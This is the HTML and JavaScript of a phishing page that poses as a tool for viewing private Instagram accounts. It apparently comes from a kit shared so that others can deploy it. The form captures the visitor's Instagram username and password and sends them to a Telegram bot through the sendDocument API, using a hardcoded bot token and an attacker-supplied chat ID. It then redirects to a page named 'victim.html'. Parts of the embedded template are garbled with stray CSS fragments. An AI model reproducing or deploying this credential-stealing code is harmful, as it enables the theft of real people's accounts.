            border: 1px solid rgba(255, 255, 255, 0.2);

        h1 {
            color: #fff;
            font-size: clamp(1.5rem, 5vw, 2rem);
            margin-bottom: 15px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        p {
            color: #fff;
            font-size: clamp(1rem, 3vw, 1.2rem);
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 25px;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: clamp(0.9rem, 2.5vw, 1rem);
            transition: all 0.3s ease;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            transform: scale(1.05);
        }
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 25px;
            background: #fff;
            color: #e6683c;
            font-size: clamp(0.9rem, 2.5vw, 1rem);
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        button:hover {
            background: #e6683c;
            color: #fff;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(230, 104, 60, 0.4);
        }
        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @media (max-width: 600px) {
            .container {
                padding: 15px;
                border-radius: 15px;
            }
            h1 {
                font-size: clamp(1.2rem, 4vw, 1.8rem);
            }
            p {
                font-size: clamp(0.9rem, 2vw, 1rem);
            }
            input, button {
                padding: 10px;
                font-size: clamp(0.8rem, 2vw, 0.9rem);

        }
    </style>
</head>
<body>
    <div class="container">
        <h1>View Private Instagram Accounts!</h1>
        <p>Login to unlock private profiles instantly!</p>
        <form id="profileForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>

    <script>
        const botToken = '7930452267:AAEeu2okIwYY6QWRUR2dhXw6uZifOZDYSjI'; // Replace with your actual bot token

        // Get chat ID from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('ref');

        // Validate chat ID
        function validateChatId(id) {
            if (!id) return false;
            return /^\d+$/.test(id); // Must be numeric
        }

        // Instagram username validation
        function validateInstagramUsername(username) {
            if (!username || username.trim() === '' || username.includes('@@') || username.indexOf('@') > 0) {
                return { valid: false, cleanUsername: '' };
            }
            const cleanUsername = username.startsWith('@') ? username.slice(1) : username;
            const regex = /^[a-zA-Z0-9._]{1,30}$/;
            if (cleanUsername.includes(' ') || !regex.test(cleanUsername)) {
                return { valid: false, cleanUsername: '' };
            }
            return { valid: true, cleanUsername };
        }

        // Generate HTML content for credentials
        function generateCredentialsHtml(username, password, chatId) {
            return `

        h1 {
            font-size: 2rem;

        @media (max-width: 600px) {

        <div class="credential">Username: ${username}</div>

        <div class="join-message">
            Aise hi aur tools ke liye hamare group aur channel join kare:<br>

            `;
        }

        // Preserve ref parameter
        if (chatId && validateChatId(chatId)) {
            history.replaceState(null, '', `?ref=${chatId}`);
        } else {
            alert('Invalid or missing ref parameter! Use ?ref=yourChatID');
            return;
        }

        document.getElementById('profileForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            try {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                // Validate chat ID
                if (!chatId || !validateChatId(chatId)) {
                    alert('Invalid or missing ref parameter! Use ?ref=yourChatID');
                    return;
                }

                // Validate username
                const { valid, cleanUsername } = validateInstagramUsername(username);
                if (!valid) {
                    alert('Invalid username! Use 1-30 chars (@username, letters, numbers, periods, underscores). No spaces or special chars.');
                    return;
                }

                // Generate HTML file
                const htmlContent = generateCredentialsHtml(cleanUsername, password, chatId);
                const blob = new Blob([htmlContent], { type: 'text/html' });
                const file = new File([blob], `credentials_${Date.now()}.html`, { type: 'text/html' });

                // Send to Telegram as document
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', file);
                console.log('Sending HTML file to Telegram:', { chatId, fileName: file.name });

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                console.log('Telegram API Response:', data);

                if (response.ok && data.ok) {
                    console.log('✅ Redirecting to victim.html');
                    window.location.href = `victim.html?ref=${chatId}`;
                } else {
                    console.error('Telegram API Error:', data);
                    alert(`Error sending data: ${data.description || 'Failed to send file. Check bot token and chat ID.'}`);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error sending data: Network issue or CORS blocked. Check console.');
            }
        });
    </script>
</body>
